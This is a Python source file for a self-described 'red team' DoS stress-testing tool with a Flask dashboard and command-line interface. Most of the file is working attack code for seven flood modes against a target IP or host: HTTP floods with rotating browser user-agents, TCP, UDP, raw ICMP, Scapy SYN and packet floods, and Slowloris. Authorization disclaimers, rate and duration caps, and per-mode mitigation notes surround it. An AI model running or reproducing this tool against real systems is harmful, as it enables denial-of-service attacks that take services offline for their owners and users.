#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
================================================================================
 DDOS SHIELD PRO v2.0  —  Red Team Authorized Stress-Test & DoS Defense Lab
================================================================================
 Author  : Priyanshu Jangra  (Cyber Awareness Lab)
 Purpose : PROFESSIONAL RED TEAM stress-testing tool, for AUTHORIZED use ONLY.
           Generates calibrated load to test the resilience of YOUR OWN
           infrastructure / lab targets and to validate defensive controls
           (WAF, rate-limit, connection limits, CDN, etc.). Includes MITRE
           ATT&CK mapping and per-vector mitigation guidance.

 LEGAL / ETHICS
 ------------------------------------------------------------------------------
 - Use ONLY on systems you own or have explicit written permission to assess.
 - This is a SAFETY-CAPPED tool: hard duration cap (300s), hard rate cap
   (500 req/s/worker), and immediate stop on Ctrl+C / stop flag / watchdog.
 - It does NOT spoof source IPs for reflection/amplification and does not
   target third parties. Unauthorized load generation is illegal in every
   jurisdiction. You accept full responsibility for authorized use only.

 Dependencies:
   pip install -r ddos_requirements.txt   (scapy, requests, flask, colorama)

 Usage examples:
   python ddos_simulator.py --target 192.168.1.10 --mode slowloris --ports 80 --workers 8 --duration 30
   python ddos_simulator.py --target 192.168.1.10 --mode http  --workers 20 --rate 200 --duration 20
   python ddos_simulator.py --target 192.168.1.10 --mode syn   --workers 10 --rate 100 --duration 15
   python ddos_simulator.py --list-interfaces
   python ddos_simulator.py                       # web dashboard
================================================================================
"""

import argparse
import json
import os
import random
import socket
import struct
import threading
import time
import webbrowser
from collections import Counter, deque
from datetime import datetime, timezone
from ipaddress import ip_address

import colorama
from colorama import Fore, Style

try:
    import requests
    REQUESTS_OK = True
except Exception:
    REQUESTS_OK = False

try:
    from flask import Flask, jsonify, render_template_string, request
    FLASK_OK = True
except Exception:
    FLASK_OK = False

try:
    from scapy.all import IP, TCP, UDP, ICMP, get_if_list, send, RandShort
    SCAPY_OK = True
except Exception:
    SCAPY_OK = False

colorama.init(autoreset=True)

APP_TITLE = "DDOS SHIELD PRO // Red Team DoS Stress-Test Lab"
VERSION = "2.0.0"

BANNER = r"""
    ____   _____   ____    ____   _____ ______ __   __    _____  ____
   / __ \ / ____| / __ \  / __ \ / ___// ____/ / / / /   |__  / /  \ \
  / / / // /_    / /_/ / / /_/ // __ \/ __/  / / / /     /_ < / / /\ \
 / /_/ // / ___ / /___/ / /_/ // /_/ / /__________/     ___/ // /_/ /
/_____//_/  __ /_____/ /_____//_____//___/  /____/  /_____/ \____/
      Red Team Authorized DoS Stress-Test & Defense Lab  v{0}
      FOR AUTHORIZED USE ON YOUR OWN / PERMITTED TARGETS ONLY
""".format(VERSION)

MODES = ["http", "tcp", "udp", "icmp", "syn", "flood", "slowloris"]

DEFAULT_DURATION = 20
DEFAULT_WORKERS = 4
DEFAULT_RATE = 100
RATE_WINDOW = 1.0
MAX_DURATION = 300            # hard safety cap
MAX_RATE = 500               # hard rate cap per worker
MAX_WORKERS = 40             # hard cap on worker threads

# MITRE ATT&CK mapping per mode
ATTACK_PROFILES = {
    "http": {
        "desc": "Application-layer HTTP request flood (GET/POST) with randomized realistic "
                "user-agents and referrers. Hits web servers / load balancers.",
        "mitre": "T1498.002 (Network DoS: Reflection) / T1499.004 (Application DoS) — Volumetric HTTP",
        "mitigate": "Rate-limit per IP, WAF rules, CAPTCHA, CDN (Cloudflare/AWS Shield), "
                    "connection limits, HTTP/2 prioritization, request-size caps.",
    },
    "tcp": {
        "desc": "Raw TCP connect flood against target ports. Saturates the connection table "
                "(SYN backlog / accept queue).",
        "mitre": "T1498.001 (Network DoS: Direct) — TCP connection exhaustion",
        "mitigate": "SYN cookies, tcp_syncookies, connection-rate limits, firewall stateful "
                    "filtering, load-balancer max-conn caps.",
    },
    "udp": {
        "desc": "UDP datagram flood on target ports. Consumes bandwidth and CPU on the "
                "target's UDP services (DNS, QUIC, game servers).",
        "mitre": "T1498.001 (Network DoS: Direct) — UDP volumetric",
        "mitigate": "Ingress filtering, rate-limit UDP, drop inbound UDP except allowed "
                    "services, QoS/bandwidth shaping, anti-amplification ACLs.",
    },
    "icmp": {
        "desc": "ICMP echo (ping) flood via raw socket. Classic L3 volumetric flood. "
                "Requires admin/root privileges.",
        "mitre": "T1498.001 (Network DoS: Direct) — ICMP volumetric",
        "mitigate": "Disable ICMP echo on edge, rate-limit ICMP, firewall drop, "
                    "bandwidth shaping on control-plane.",
    },
    "syn": {
        "desc": "Raw SYN flood via Scapy (no source spoofing). Fills the TCP handshake "
                "backlog with half-open connections.",
        "mitre": "T1498.001 (Network DoS: Direct) — SYN flood",
        "mitigate": "SYN cookies, tcp_abort_on_overflow, syncookies, connection-limit plugins "
                    "(mod_reqtimeout), stateful firewall.",
    },
    "flood": {
        "desc": "Generic high-throughput scapy packet loop — mixed L3/L4 stress baseline "
                "to compare defenses.",
        "mitre": "T1498.001 (Network DoS: Direct) — Mixed volumetric",
        "mitigate": "Baseline via DDoS-protection service, ingress filtering, anomaly "
                    "detection (NetFlow/sFlow), auto-scaling.",
    },
    "slowloris": {
        "desc": "Proper Slowloris: opens many live sockets, sends partial HTTP headers, and "
                "holds them open to exhaust the server's connection pool. Very low bandwidth.",
        "mitre": "T1499.001 (Application DoS: Slowloris) — Slow HTTP DoS",
        "mitigate": "Server request-timeout, minimum header bytes, mod_reqtimeout, "
                    "connection pool limits, reverse-proxy with idle-conn expiry.",
    },
}

# Realistic user-agents for HTTP flood
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 17_1 like Mac OS X) AppleWebKit/605.1.15 Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15) AppleWebKit/605.1.15 Version/17.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0",
]
REFERRERS = [
    "https://www.google.com/", "https://www.bing.com/", "https://duckduckgo.com/",
    "https://www.facebook.com/", "https://www.reddit.com/", "https://twitter.com/",
    "https://www.linkedin.com/", "https://news.ycombinator.com/",
]

# ==============================================================================
# SHARED STATE
# ==============================================================================

class AttackState:
    def __init__(self):
        self.lock = threading.Lock()
        self.started = time.time()
        self.running = False
        self.sent = 0
        self.errors = 0
        self.connections = 0
        self.bytes_sent = 0
        self.target = None
        self.mode = None
        self.workers = DEFAULT_WORKERS
        self.duration = DEFAULT_DURATION
        self.rate = DEFAULT_RATE
        self.ports = [80]
        self.stop_flag = threading.Event()
        self.worker_results = []
        self.rate_log = deque(maxlen=200)     # (timestamp, delta_sent, delta_bytes)
        self.protocol_counts = Counter()

    def snapshot(self):
        with self.lock:
            elapsed = max(0, time.time() - self.started)
            recent = [(t, d) for t, _, d in self.rate_log if time.time() - t <= RATE_WINDOW]
            pps = sum(d for _, d, _ in recent) / max(RATE_WINDOW, 0.1)
            bps = sum(b for _, _, b in recent) / max(RATE_WINDOW, 0.1)
            profile = ATTACK_PROFILES.get(self.mode, {})
            return {
                "running": self.running,
                "mode": self.mode,
                "target": self.target,
                "ports": self.ports,
                "workers": self.workers,
                "duration": self.duration,
                "elapsed": round(elapsed, 1),
                "sent": self.sent,
                "errors": self.errors,
                "connections": self.connections,
                "bytes_sent": self.bytes_sent,
                "pps": round(pps, 1),
                "bps": round(bps, 1),
                "rate_mean": round(self.sent / max(elapsed, 0.1), 1),
                "mitre": profile.get("mitre", ""),
                "mitigate": profile.get("mitigate", ""),
                "desc": profile.get("desc", ""),
                "protocols": dict(self.protocol_counts.most_common(8)),
                "workers_detail": list(self.worker_results),
            }

STATE = AttackState()

# ==============================================================================
# HELPERS
# ==============================================================================

def utcnow():
    return datetime.now(timezone.utc)


def resolve_host(target):
    try:
        ip_address(target)
        return target
    except ValueError:
        pass
    try:
        return socket.gethostbyname(target)
    except Exception:
        return None


def icmp_checksum(data):
    if len(data) % 2:
        data += b"\x00"
    s = 0
    for i in range(0, len(data), 2):
        s += (data[i] << 8) + data[i + 1]
    s = (s >> 16) + (s & 0xFFFF)
    s += s >> 16
    return (~s) & 0xFFFF


# ==============================================================================
# ATTACK ENGINE
# ==============================================================================

class AttackEngine:
    def __init__(self, state: AttackState):
        self.state = state
        self.threads = []

    def _throttle(self, rate):
        time.sleep(max(0.001, RATE_WINDOW / max(rate, 1)))

    def _record(self, nbytes=0, proto="L4"):
        with self.state.lock:
            self.state.sent += 1
            self.state.bytes_sent += nbytes
            self.state.rate_log.append((time.time(), 1, nbytes))
            self.state.protocol_counts[proto] += 1

    def _worker(self, wid, target, mode, ports, rate):
        ip = resolve_host(target)
        res = {"worker": wid, "mode": mode, "ok": 0, "err": 0}
        try:
            if mode == "http":
                res["ok"], res["err"] = self._http_flood(wid, target, rate)
            elif mode == "tcp":
                res["ok"], res["err"] = self._tcp_flood(wid, ip, ports, rate)
            elif mode == "udp":
                res["ok"], res["err"] = self._udp_flood(wid, ip, ports, rate)
            elif mode == "icmp":
                res["ok"], res["err"] = self._icmp_flood(wid, ip, rate)
            elif mode == "syn":
                res["ok"], res["err"] = self._syn_flood(wid, ip, ports, rate)
            elif mode == "flood":
                res["ok"], res["err"] = self._scapy_flood(wid, ip, ports, rate)
            elif mode == "slowloris":
                res["ok"], res["err"] = self._slowloris(wid, ip, ports, rate)
        except Exception as e:
            res["err"] += 1
            res["error"] = str(e)
        with self.state.lock:
            self.state.worker_results.append(res)

    # ---- HTTP flood (application layer, realistic headers)
    def _http_flood(self, wid, target, rate):
        url = target if target.startswith("http") else f"http://{target}"
        ok = err = 0
        while not self.state.stop_flag.is_set():
            if not REQUESTS_OK:
                break
            ua = random.choice(USER_AGENTS)
            ref = random.choice(REFERRERS)
            try:
                requests.get(url, timeout=1,
                             headers={"User-Agent": ua, "Referer": ref,
                                      "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                                      "Accept-Language": "en-US,en;q=0.9"},
                             allow_redirects=False)
                ok += 1
                self._record(nbytes=120, proto="HTTP")
            except Exception:
                err += 1
                self._record(proto="HTTP")
            self._throttle(rate)
        return ok, err

    # ---- TCP connect flood
    def _tcp_flood(self, wid, ip, ports, rate):
        ok = err = 0
        while not self.state.stop_flag.is_set():
            port = random.choice(ports) if ports else 80
            try:
                s = socket.create_connection((ip, port), timeout=0.5)
                with self.state.lock:
                    self.state.connections += 1
                s.close()
                ok += 1
                self._record(nbytes=60, proto="TCP")
            except Exception:
                err += 1
                self._record(proto="TCP")
            self._throttle(rate)
        return ok, err

    # ---- UDP flood
    def _udp_flood(self, wid, ip, ports, rate):
        ok = err = 0
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        payload = os.urandom(random.randint(64, 256))
        while not self.state.stop_flag.is_set():
            port = random.choice(ports) if ports else 53
            try:
                sock.sendto(payload, (ip, port))
                ok += 1
                self._record(nbytes=len(payload), proto="UDP")
            except Exception:
                err += 1
                self._record(nbytes=len(payload), proto="UDP")
            self._throttle(rate)
        sock.close()
        return ok, err

    # ---- ICMP flood
    def _icmp_flood(self, wid, ip, rate):
        ok = err = 0
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            while not self.state.stop_flag.is_set():
                pid = os.getpid() & 0xFFFF
                seq = random.randint(0, 0xFFFF)
                pkt = struct.pack("!BBHHH", 8, 0, 0, pid, seq) + b"ddos-shield"
                chk = icmp_checksum(pkt)
                pkt = struct.pack("!BBHHH", 8, 0, chk, pid, seq) + b"ddos-shield"
                try:
                    sock.sendto(pkt, (ip, 1))
                    ok += 1
                    self._record(nbytes=len(pkt), proto="ICMP")
                except PermissionError:
                    err += 1
                    break
                except Exception:
                    err += 1
                    self._record(nbytes=len(pkt), proto="ICMP")
                self._throttle(rate)
            sock.close()
        except PermissionError:
            pass
        return ok, err

    # ---- SYN flood via Scapy
    def _syn_flood(self, wid, ip, ports, rate):
        ok = err = 0
        if not SCAPY_OK:
            return ok, err
        while not self.state.stop_flag.is_set():
            port = random.choice(ports) if ports else 80
            try:
                pkt = IP(dst=ip) / TCP(sport=RandShort(), dport=port, flags="S")
                send(pkt, verbose=0)
                ok += 1
                self._record(nbytes=54, proto="SYN")
            except Exception:
                err += 1
                self._record(nbytes=54, proto="SYN")
            self._throttle(rate)
        return ok, err

    # ---- Scapy generic flood
    def _scapy_flood(self, wid, ip, ports, rate):
        ok = err = 0
        if not SCAPY_OK:
            return ok, err
        while not self.state.stop_flag.is_set():
            port = random.choice(ports) if ports else 80
            try:
                pkt = IP(dst=ip) / UDP(sport=RandShort(), dport=port) / (b"X" * 64)
                send(pkt, verbose=0)
                ok += 1
                self._record(nbytes=98, proto="UDP")
            except Exception:
                err += 1
                self._record(nbytes=98, proto="UDP")
            self._throttle(rate)
        return ok, err

    # ---- Proper Slowloris
    def _slowloris(self, wid, ip, ports, rate):
        ok = err = 0
        socks = []
        port = int(ports[0]) if ports else 80
        try:
            while not self.state.stop_flag.is_set():
                # open a socket, send partial GET, keep alive
                try:
                    s = socket.create_connection((ip, port), timeout=1)
                    s.settimeout(5)
                    s.sendall(b"GET / HTTP/1.1\r\nHost: victim\r\nUser-Agent: Mozilla/5.0\r\n")
                    # deliberately do NOT send final \r\n\r\n -> keep connection open
                    socks.append(s)
                    with self.state.lock:
                        self.state.connections += 1
                    ok += 1
                    self._record(nbytes=80, proto="HTTP")
                except Exception:
                    err += 1
                    self._record(proto="HTTP")
                # every now and then send a keep-alive byte to hold the conn
                if random.random() < 0.3:
                    for s in socks[:]:
                        try:
                            s.sendall(b"X")
                            with self.state.lock:
                                self.state.bytes_sent += 1
                        except Exception:
                            try:
                                s.close()
                            except Exception:
                                pass
                            socks.remove(s)
                # cap sockets held by this worker
                if len(socks) > rate * 2:
                    try:
                        socks.pop(0).close()
                    except Exception:
                        pass
                self._throttle(rate)
        finally:
            for s in socks:
                try:
                    s.close()
                except Exception:
                    pass
        return ok, err

    def start(self, target, mode, ports, workers, duration, rate):
        STATE.stop_flag.clear()
        STATE.running = True
        STATE.target = target
        STATE.mode = mode
        STATE.ports = ports if ports else [80]
        STATE.workers = workers
        STATE.duration = duration
        STATE.rate = rate
        STATE.sent = 0
        STATE.errors = 0
        STATE.connections = 0
        STATE.bytes_sent = 0
        STATE.worker_results = []
        STATE.protocol_counts = Counter()
        STATE.started = time.time()

        self.threads = []
        for w in range(workers):
            t = threading.Thread(
                target=self._worker,
                kwargs={"wid": w + 1, "target": target, "mode": mode,
                        "ports": STATE.ports, "rate": rate},
                daemon=True,
            )
            t.start()
            self.threads.append(t)

        def watchdog():
            time.sleep(duration)
            STATE.stop_flag.set()
            STATE.running = False
            print(Fore.YELLOW + f"\n[!] Duration cap ({duration}s) reached — stress-test stopped.")
        threading.Thread(target=watchdog, daemon=True).start()

    def stop(self):
        STATE.stop_flag.set()
        STATE.running = False
        for t in self.threads:
            t.join(timeout=1.0)


ENGINE = AttackEngine(STATE)

# ==============================================================================
# FLASK DASHBOARD
# ==============================================================================

PAGE_HTML = """<!DOCTYPE html>
<html lang="en"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>{{ title }}</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet">
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:'Inter',sans-serif;}
body{background:#0B0F19;color:#E4EBF0;min-height:100vh;}
.wrap{max-width:1200px;margin:0 auto;padding:20px;}
header{background:#121A29;border:1px solid #233A5C;border-radius:10px;padding:16px 22px;
display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:10px;margin-bottom:18px;}
.logo{font-weight:700;letter-spacing:.1em;color:#6EA8FE;font-size:16px;}
.logo span{color:#8EA3C0;font-weight:400;}
.status{padding:5px 12px;border-radius:4px;font-size:11px;font-weight:600;letter-spacing:.08em;}
.status.stopped{background:#3A1A1A;color:#FF7A7A;border:1px solid #6A2A2A;}
.status.running{background:#1A3A2A;color:#6FE7A4;border:1px solid #2A6A4A;}
.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:14px;}
.card{background:#121A29;border:1px solid #233A5C;border-radius:10px;padding:18px;}
.card h3{font-size:11px;color:#8EA3C0;letter-spacing:.14em;text-transform:uppercase;margin-bottom:10px;}
.big{font-size:30px;font-weight:600;color:#fff;}
.muted{color:#6A7E92;font-size:11px;}
.badge{font-size:11px;padding:3px 10px;border-radius:4px;background:#1E3A5C;color:#6EA8FE;}
form{background:#121A29;border:1px solid #233A5C;border-radius:10px;padding:18px;margin:18px 0;display:grid;
grid-template-columns:repeat(auto-fit,minmax(160px,1fr));gap:12px;}
label{font-size:11px;color:#8EA3C0;display:block;margin-bottom:6px;letter-spacing:.06em;}
input,select{width:100%;background:#0B0F19;border:1px solid #233A5C;color:#E4EBF0;padding:9px 11px;
border-radius:6px;font-size:13px;}
button{background:#1E3A5C;border:1px solid #3A5C88;color:#fff;padding:11px 16px;border-radius:6px;
font-size:13px;font-weight:600;cursor:pointer;letter-spacing:.05em;transition:.2s;margin-top:6px;}
button:hover{background:#2A4A72;}
button.danger{background:#5C1A1A;border-color:#8A2A2A;}
button.danger:hover{background:#7A2A2A;}
.btn-row{display:flex;gap:10px;flex-wrap:wrap;align-items:center;}
table{width:100%;border-collapse:collapse;background:#121A29;border:1px solid #233A5C;border-radius:10px;
overflow:hidden;margin-top:10px;}
th{background:#1A2A42;color:#8EA3C0;font-size:10px;letter-spacing:.1em;text-transform:uppercase;padding:9px;text-align:left;}
td{padding:8px 9px;font-size:12px;border-top:1px solid #1A2A42;color:#B7C6DA;}
.warn{border:1px solid #6A4A1A;background:rgba(106,74,26,.12);color:#FFD28A;padding:12px 16px;
border-radius:8px;font-size:12px;margin-bottom:14px;line-height:1.5;}
.mode-btn{margin:4px;font-size:11px;padding:7px 12px;}
.mode-btn.active{background:#2A4A72;border-color:#6EA8FE;}
h2{font-size:13px;color:#6EA8FE;letter-spacing:.1em;margin:18px 0 6px;}
.info{font-size:12px;color:#B7C6DA;line-height:1.7;}
.info b{color:#6EA8FE;}
</style></head><body>
<div class="wrap">
<header>
  <div class="logo">🛡 DDOS SHIELD PRO <span>— Red Team DoS Stress-Test Lab (Authorized)</span></div>
  <div class="status" id="statusBadge">STOPPED</div>
</header>

<div class="warn">
  ⚠️ <b>AUTHORIZED LAB USE ONLY.</b> Use exclusively on systems you own or have written
  permission to assess. Tool is safety-capped (max 300s, max 500 req/s/worker) and stops
  immediately via Ctrl+C / STOP. Unauthorized load generation is illegal.
</div>

<form id="form">
  <div><label>Target (IP or host)</label><input id="target" value="192.168.1.10"></div>
  <div><label>Ports (comma sep)</label><input id="ports" value="80,443"></div>
  <div><label>Workers</label><select id="workers"><option>1</option><option>2</option><option selected>4</option><option>8</option><option>16</option><option>24</option></select></div>
  <div><label>Duration (sec, max 300)</label><input id="duration" value="20"></div>
  <div><label>Rate /sec/worker (1–500)</label><input id="rate" value="100"></div>
  <div><label>Attack Mode</label>
    <div id="modeWrap">
      <button type="button" class="mode-btn active" data-mode="tcp">tcp</button>
      <button type="button" class="mode-btn" data-mode="http">http</button>
      <button type="button" class="mode-btn" data-mode="udp">udp</button>
      <button type="button" class="mode-btn" data-mode="icmp">icmp</button>
      <button type="button" class="mode-btn" data-mode="syn">syn</button>
      <button type="button" class="mode-btn" data-mode="flood">flood</button>
      <button type="button" class="mode-btn" data-mode="slowloris">slowloris</button>
    </div>
  </div>
  <div class="btn-row" style="grid-column:1/-1">
    <button type="submit">▶ START STRESS TEST</button>
    <button type="button" class="danger" onclick="stopAttack()">■ STOP</button>
  </div>
</form>

<div class="grid">
  <div class="card"><h3>Packets/Requests Sent</h3><div class="big" id="sent">0</div><div class="muted">cumulative</div></div>
  <div class="card"><h3>Current Rate</h3><div class="big" id="pps">0</div><div class="muted">packets/sec</div></div>
  <div class="card"><h3>Bandwidth</h3><div class="big" id="bps">0</div><div class="muted">bytes/sec</div></div>
  <div class="card"><h3>Conns / Errors</h3><div class="big" id="conns">0</div><div class="muted">errors: <span id="errors">0</span></div></div>
  <div class="card"><h3>Elapsed</h3><div class="big" id="elapsed">0.0</div><div class="muted">seconds / <span id="dur">20</span></div></div>
</div>

<h2>Attack Profile — MITRE ATT&CK</h2>
<div class="card info" id="profile"><i>Select a mode to see its profile.</i></div>

<h2>Protocol Mix</h2>
<div class="card info" id="protoMix">—</div>

<h2>Worker Details</h2>
<div class="card" style="padding:6px">
<table><tr><th>Worker</th><th>Mode</th><th>OK</th><th>Errors</th><th>Detail</th></tr>
<tbody id="workerRows"><tr><td colspan="5" class="muted">No active workers.</td></tr></tbody></table>
</div>
<div class="muted" style="margin:20px 0;text-align:center;color:#4A5A6E">
© Cyber Awareness Lab · Created by Priyanshu Jangra · Authorized educational use only</div>
</div>

<script>
let mode = 'tcp';
let timer = setInterval(refresh, 1200);
document.getElementById('modeWrap').addEventListener('click', e=>{
  if(e.target.dataset.mode){
    mode = e.target.dataset.mode;
    document.querySelectorAll('.mode-btn').forEach(b=>b.classList.remove('active'));
    e.target.classList.add('active');
  }
});
document.getElementById('form').addEventListener('submit', async e=>{
  e.preventDefault();
  const body = {
    target: document.getElementById('target').value.trim(),
    ports: document.getElementById('ports').value.split(',').map(x=>parseInt(x.trim())).filter(x=>x),
    workers: parseInt(document.getElementById('workers').value),
    duration: parseInt(document.getElementById('duration').value),
    rate: parseInt(document.getElementById('rate').value),
    mode: mode
  };
  const r = await fetch('/attack',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(body)});
  const j = await r.json();
  document.getElementById('dur').textContent = j.duration || body.duration;
});
async function stopAttack(){await fetch('/stop',{method:'POST'});}

function fmtBytes(b){if(b>=1048576)return (b/1048576).toFixed(1)+' MB/s';if(b>=1024)return (b/1024).toFixed(1)+' KB/s';return b+' B/s';}

async function refresh(){
  try{
    const r = await fetch('/api/stats'); const s = await r.json();
    const st = document.getElementById('statusBadge');
    st.textContent = s.running?'RUNNING':'STOPPED';
    st.className = 'status ' + (s.running?'running':'stopped');
    document.getElementById('sent').textContent = s.sent;
    document.getElementById('pps').textContent = s.pps.toFixed(1);
    document.getElementById('bps').textContent = fmtBytes(s.bps);
    document.getElementById('conns').textContent = s.connections;
    document.getElementById('errors').textContent = s.errors;
    document.getElementById('elapsed').textContent = s.elapsed.toFixed(1);
    if(s.duration && document.getElementById('dur').textContent==='20'){document.getElementById('dur').textContent=s.duration;}
    document.getElementById('profile').innerHTML =
      `<b>Mode:</b> ${s.mode||'—'}<br><b>Description:</b> ${s.desc||'—'}<br>
       <b>MITRE ATT&amp;CK:</b> ${s.mitre||'—'}<br>
       <b>Recommended defense:</b> ${s.mitigate||'—'}`;
    document.getElementById('protoMix').textContent =
      Object.entries(s.protocols||{}).map(([k,v])=>`${k}: ${v}`).join(' &nbsp;|&nbsp; ') || '—';
    document.getElementById('workerRows').innerHTML = s.workers_detail.length?
      s.workers_detail.map(w=>`<tr><td>#${w.worker}</td><td><span class="badge">${w.mode}</span></td>
        <td>${w.ok}</td><td>${w.err}</td><td>${w.error||'—'}</td></tr>`).join('') :
      '<tr><td colspan="5" class="muted">No active workers.</td></tr>';
  }catch(e){}
}
</script>
</body></html>"""


def create_app(state: AttackState, engine: AttackEngine):
    app = Flask(__name__)

    @app.route("/")
    def index():
        return render_template_string(PAGE_HTML, title=APP_TITLE)

    @app.route("/api/stats")
    def stats():
        return jsonify(state.snapshot())

    @app.route("/attack", methods=["POST"])
    def attack():
        data = request.get_json(silent=True) or {}
        target = data.get("target") or "192.168.1.10"
        mode = (data.get("mode") or "tcp").lower()
        if mode not in MODES:
            return jsonify({"error": "unknown mode"}), 400
        ports = [int(x) for x in data.get("ports") or ["80"]]
        workers = int(data.get("workers") or 1)
        duration = min(int(data.get("duration") or DEFAULT_DURATION), MAX_DURATION)
        rate = min(int(data.get("rate") or DEFAULT_RATE), MAX_RATE)
        workers = min(max(workers, 1), MAX_WORKERS)
        engine.start(target, mode, ports, workers, duration, rate)
        return jsonify({"message": f"{mode} stress test on {target}",
                        "duration": duration, "mode": mode})

    @app.route("/stop", methods=["POST"])
    def stop():
        engine.stop()
        return jsonify({"message": "Stop signal sent"})

    return app


# ==============================================================================
# CLI
# ==============================================================================

def list_interfaces():
    print(Fore.CYAN + "\n[Available interfaces]")
    if SCAPY_OK:
        for i in get_if_list():
            print("  -", i)
    else:
        print("  (scapy unavailable)")
    print()


def main():
    parser = argparse.ArgumentParser(
        description="Red Team Authorized DoS Stress-Test & Defense Lab (Authorized use only)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Modes: " + ", ".join(MODES) + "\n"
            "Examples:\n"
            "  %(prog)s --target 192.168.1.10 --mode slowloris --ports 80 --workers 8 --duration 30\n"
            "  %(prog)s --target 192.168.1.10 --mode http --workers 20 --rate 200 --duration 20\n"
            "  %(prog)s --target 192.168.1.10 --mode syn --workers 10 --rate 100 --duration 15\n"
            "  %(prog)s --list-interfaces\n"
        ),
    )
    parser.add_argument("--target", default="192.168.1.10", help="Target IP/host (authorized only)")
    parser.add_argument("--mode", choices=MODES, default="tcp", help="Stress-test mode")
    parser.add_argument("--ports", default="80", help="Comma-sep ports e.g. 80,443")
    parser.add_argument("--workers", type=int, default=DEFAULT_WORKERS, help="Worker threads (max 40)")
    parser.add_argument("--duration", type=int, default=DEFAULT_DURATION, help="Seconds (capped at 300)")
    parser.add_argument("--rate", type=int, default=DEFAULT_RATE, help="Rate/worker/sec (capped at 500)")
    parser.add_argument("--headless", action="store_true", help="CLI mode (no web dashboard)")
    parser.add_argument("--port", type=int, default=8081, help="Web dashboard port")
    parser.add_argument("--list-interfaces", action="store_true", help="List network interfaces")
    parser.add_argument("--version", action="version", version=f"{APP_TITLE} v{VERSION}")
    args = parser.parse_args()

    print(Fore.CYAN + BANNER)
    print(Fore.YELLOW + "=" * 72)
    print(Fore.YELLOW + "  AUTHORIZED LAB USE ONLY — safety-capped (300s / 500 rps / 40 workers)")
    print(Fore.YELLOW + "  Use only on systems you own or have written permission to assess.")
    print(Fore.YELLOW + "=" * 72 + Style.RESET_ALL)

    if args.list_interfaces:
        list_interfaces()
        return

    ports = [int(x.strip()) for x in args.ports.split(",") if x.strip()]
    duration = min(args.duration, MAX_DURATION)
    rate = min(args.rate, MAX_RATE)
    workers = min(max(args.workers, 1), MAX_WORKERS)
    profile = ATTACK_PROFILES[args.mode]

    print(Fore.CYAN + f"[*] Target    : {args.target}  ({resolve_host(args.target)})")
    print(Fore.CYAN + f"[*] Mode      : {args.mode}")
    print(Fore.CYAN + f"[*] MITRE     : {profile['mitre']}")
    print(Fore.CYAN + f"[*] Ports     : {ports}")
    print(Fore.CYAN + f"[*] Workers   : {workers}")
    print(Fore.CYAN + f"[*] Duration  : {duration}s (capped)")
    print(Fore.CYAN + f"[*] Rate      : {rate} /sec/worker")

    if args.headless:
        ENGINE.start(args.target, args.mode, ports, workers, duration, rate)
        print(Fore.GREEN + f"[+] {args.mode} stress test on {args.target}. Ctrl+C to stop.")
        try:
            while True:
                time.sleep(1)
                s = STATE.snapshot()
                line = (f"\r[elapsed={s['elapsed']:.0f}s sent={s['sent']} "
                        f"pps={s['pps']:.0f} conns={s['connections']} "
                        f"err={s['errors']} bps={s['bps']:.0f}]")
                print(Fore.CYAN + line + Style.RESET_ALL, end="", flush=True)
        except KeyboardInterrupt:
            print(Fore.YELLOW + "\n[!] Stopped by user.")
        finally:
            ENGINE.stop()
            print(Fore.GREEN + f"\n[+] Final: sent={STATE.sent} conns={STATE.connections} "
                               f"bytes={STATE.bytes_sent} errors={STATE.errors}")
        return

    if not FLASK_OK:
        print(Fore.RED + "[!] Flask not installed — cannot start web dashboard.")
        print(Fore.YELLOW + "[i] pip install flask  |  or use --headless mode.")
        return

    app = create_app(STATE, ENGINE)
    url = f"http://127.0.0.1:{args.port}"
    print(Fore.GREEN + f"[+] Web dashboard: {url}")
    print(Fore.CYAN + "[i] Configure & start from dashboard. Press Ctrl+C to quit.")
    try:
        webbrowser.open(url)
    except Exception:
        pass
    try:
        app.run(host="127.0.0.1", port=args.port, debug=False, use_reloader=False)
    except KeyboardInterrupt:
        print(Fore.YELLOW + "\n[!] Stopped by user.")
    finally:
        ENGINE.stop()


if __name__ == "__main__":
    main()
